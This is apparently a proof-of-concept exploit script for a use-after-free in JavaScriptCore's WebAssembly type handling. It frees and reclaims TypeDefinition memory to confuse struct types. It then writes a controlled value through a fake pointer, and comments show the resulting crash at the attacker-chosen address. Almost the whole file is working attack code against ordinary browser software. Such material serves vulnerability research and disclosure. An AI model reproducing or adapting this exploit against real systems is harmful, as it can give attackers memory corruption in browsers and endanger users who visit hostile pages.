load("wasm-module-builder.js");

gc();

const kNumGlobals = 1000;
const kNumFields = kNumGlobals;

// Dummy module. This will be freed later on to trigger TypeInformation::tryCleanup()
// to actually free the dangling TypeDefinition objects.
let dummyModule = (new WasmModuleBuilder()).instantiate();

const builder1 = new WasmModuleBuilder();
let typeIndex = builder1.addStruct([makeField(kWasmI64, true)]);

const initExpr = [
  ...wasmI64Const(0x0000414141414141),
  kGCPrefix, kExprStructNew, ...wasmUnsignedLeb(typeIndex)
]

// We just allocate one TypeDefinition object here and attempt to reclaim that one later on.
// Likely the reliability could be improved by better heap shaping here.
builder1.addGlobal(wasmRefNullType(typeIndex), true, false, initExpr).exportAs("global1");
builder1.addGlobal(wasmRefNullType(typeIndex), true, false, initExpr).exportAs("global2");

let instance1 = builder1.instantiate();
let global1 = instance1.exports.global1;
let global2 = instance1.exports.global2;

// Create the 2nd module now to avoid heap allocations later on.
// This module will try to reclaim the freed TypeDefinition with a different one.
let builder2 = new WasmModuleBuilder();
let simpleStruct = builder2.addStruct([makeField(kWasmI64, true)]);
for (let i = 0; i < kNumGlobals; i++) {
  let fields = [makeField(wasmRefNullType(simpleStruct), true)]
  for (let j = 0; j < kNumFields; j++) {
    if (j == i) {
      fields.push(makeField(kWasmF32, true));
    } else {
      fields.push(makeField(kWasmI32, true));
    }
  }
  let typeIndex = builder2.addStruct(fields);

  const initExpr = [kExprRefNull, ...wasmSignedLeb(simpleStruct, kMaxVarInt32Size)];
  for (let j = 0; j < kNumFields; j++) {
    if (j == i) {
      initExpr.push(...wasmF32Const(0.0));
    } else {
      initExpr.push(...wasmI32Const(0));
    }
  }
  initExpr.push(...[kGCPrefix, kExprStructNew, ...wasmUnsignedLeb(typeIndex)])

  builder2.addGlobal(wasmRefType(typeIndex), true, false, initExpr).exportAs("global" + i);
}


// Free the module owning the TypeDefinitions of the exported globals.
instance1 = null;
gc();
print("[*] Freed owning module of TypeDefinition");

// Free dummy module to trigger TypeInformation::tryCleanup().
dummyModule = null;
gc();
print("[*] Freed TypeDefinition after TypeInformation::tryCleanup()");


// Instantiate the 2nd module to try to reclaim freed types with different ones
let instance2 = builder2.instantiate();
let newGlobals = [];
for (let i = 0; i < kNumGlobals; i++) {
  newGlobals.push(instance2.exports["global" + i]);
}

let overlapIndex = -1;
for (let i = 0; i < kNumGlobals; i++) {
  let newGlobal = newGlobals[i];
  try {
    // This will only succeed if the TypeDefinition of the ith global reclaimed the memory chunk of the freed TypeDefinition.
    global1.value = newGlobal.value;
    overlapIndex = i;
    print("[*] Reclaimed same allocation with TypeDefinition " + i);
    break;
  } catch (e) {}
}

if (overlapIndex == -1) {
  throw "Failed to reclaim TypeDefinition :(";
}

// Instantiate a 3rd module to import the broken global
const builder3 = new WasmModuleBuilder();
simpleStruct = builder3.addStruct([makeField(kWasmI64, true)]);
let fields = [makeField(wasmRefNullType(simpleStruct), true)];
for (let i = 0; i < kNumFields; i++) {
  if (i == overlapIndex) {
    fields.push(makeField(kWasmF32, true));
  } else {
    fields.push(makeField(kWasmI32, true));
  }
}
typeIndex = builder3.addStruct(fields);

const globalType = wasmRefNullType(typeIndex);
let globalIndex = builder3.addImportedGlobal("imports", "global", globalType, true, false);

const funcSig = makeSig([kWasmI64], []);
const funcSigIndex = builder3.addType(funcSig);
builder3.addFunction("boom", funcSigIndex)
  .addBody([
    kExprGlobalGet, globalIndex,
    kGCPrefix, kExprStructGet, ...wasmUnsignedLeb(typeIndex), 0,
    kExprLocalGet, 0,
    kGCPrefix, kExprStructSet, simpleStruct, 0,
  ])
  .exportFunc();

// Use the 2nd global since we overwrote the value of the first one
let instance3 = builder3.instantiate({ imports: { global: global2 } });
print("[*] Successfully imported broken WebAssembly.Global into new module");
instance3.exports.boom(0x1337n);

// If successful, this should now crash with a controlled pointer to a WebAssembly object, for example:
//
// Process 39011 launched: 'DebugBuild/Debug/jsc' (arm64)
// Process 39011 stopped
// * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x414141414146)
//    frame #0: 0x000000010a298124 JavaScriptCore`JSC::JSCell::isObject(this=0x0000414141414141) const at JSCellInlines.h:231:31

